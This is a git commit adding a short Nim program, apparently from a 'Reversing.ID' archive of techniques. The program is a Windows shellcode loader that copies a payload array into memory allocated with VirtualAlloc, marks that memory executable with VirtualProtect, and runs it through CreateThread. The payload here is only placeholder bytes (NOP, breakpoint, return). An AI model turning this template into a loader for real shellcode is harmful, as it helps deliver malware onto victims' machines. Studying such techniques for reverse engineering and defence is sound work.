1dd559e17633ca5f38b5e93bb74c0b58c1db9677
xathrya <me@xathrya.id>
2022-03-26 07:29:15 +0700

    nim storing shellcode in stack

---
+++ windows/storage/stack/nim/code.nim
@@ -0,0 +1,35 @@
+#[
+    Shellcode Loader
+    Archive of Reversing.ID
+
+    storing payload in stack
+
+Compile:
+    $ nim c code.nim
+
+Technique:
+    - allocation: VirtualAlloc
+    - permission: VirtualProtect
+    - execution:  CreateThread
+]#
+import winim 
+
+when isMainModule:
+    var old_protect: DWORD = 0
+
+    # shellcode storage in stack
+    var payload: array[4, byte] = [byte 0x90, 0x90, 0xCC, 0xC3 ]
+
+    # allocate memory buffer for payload as READ-WRITE (no executable)    
+    var runtime = VirtualAlloc(nil, payload.len, MEM_COMMIT, PAGE_READWRITE)
+
+    # copy payload to the buffer
+    copyMem(runtime, unsafeAddr payload, payload.len)
+
+    # make buffer executable (R-X)
+    var retval = VirtualProtect(runtime, payload.len, PAGE_EXECUTE_READ, addr old_protect)
+    if retval != 0:
+        var thread = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](runtime), nil, 0, nil)
+        WaitForSingleObject(thread, -1)
+    
+    VirtualFree(runtime, payload.len, MEM_RELEASE)
